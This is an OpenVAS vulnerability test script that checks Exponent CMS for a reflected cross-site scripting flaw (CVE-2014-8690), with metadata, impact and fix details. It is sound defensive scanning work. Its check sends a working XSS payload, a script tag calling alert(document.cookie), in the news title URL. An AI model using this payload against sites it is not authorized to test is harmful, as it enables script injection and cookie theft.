###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_exponent_cms_mult_xss_vuln_feb15.nasl 14117 2019-03-12 14:02:42Z cfischer $
#
# Exponent CMS Multiple XSS Vulnerabilities - Feb15
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:exponentcms:exponent_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805139");
  script_version("$Revision: 14117 $");
  script_cve_id("CVE-2014-8690");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-03-12 15:02:42 +0100 (Tue, 12 Mar 2019) $");
  script_tag(name:"creation_date", value:"2015-02-16 13:11:02 +0530 (Mon, 16 Feb 2015)");
  script_name("Exponent CMS Multiple XSS Vulnerabilities - Feb15");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_exponet_cms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ExponentCMS/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36059");

  script_tag(name:"summary", value:"This host is installed with Exponent CMS
  and is prone to multiple xss vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaws are due to the /users/edituser and
  the /news/ functionality does not validate input to the 'First Name' and
  'Last Name' fields before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Exponent CMS version 2.3.1, Prior versions
  may also be affected.");

  script_tag(name:"solution", value:"Apply the patch version 2.3.1 Patch 4.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/news/show/title/"><script>alert(document.cookie)</script>';

if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"<script>alert\(document.cookie\)</script>",
                     extra_check:">Exponent<" ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );